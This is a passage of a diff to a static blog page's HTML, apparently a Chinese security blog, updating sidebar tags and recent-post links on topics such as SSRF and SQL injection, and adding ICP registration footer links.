-        href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" 
-        title="Redis未授权访问">
-        <div class="tags-list-item">Redis未授权访问</div>
-      </a>
-    
-      <a 
-        href="/tags/requests%E6%A8%A1%E5%9D%97/" 
-        title="requests模块">
-        <div class="tags-list-item">requests模块</div>
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
       </a>
     
   </div>
@@ -765,23 +791,23 @@
   <div class="recent-posts-list">
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-19</div>
-        <a href="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/"><div class="recent-posts-item-content">Pocsuite3重写redis脚本</div></a>
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-19</div>
-        <a href="/article/Pocsuite3%E4%BD%BF%E7%94%A8/"><div class="recent-posts-item-content">Pocsuite3使用</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-09</div>
-        <a href="/article/SQL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"><div class="recent-posts-item-content">SQL注入方法总结</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
       </div>
     
       <div class="recent-posts-item">
-        <div class="recent-posts-item-title">2021-07-09</div>
-        <a href="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/"><div class="recent-posts-item-content">Burpsuite挂梯子抓包</div></a>
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
       </div>
     
   </div>
@@ -818,6 +844,18 @@
 
     
     
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
     
     
       <div class="footer-dsc">
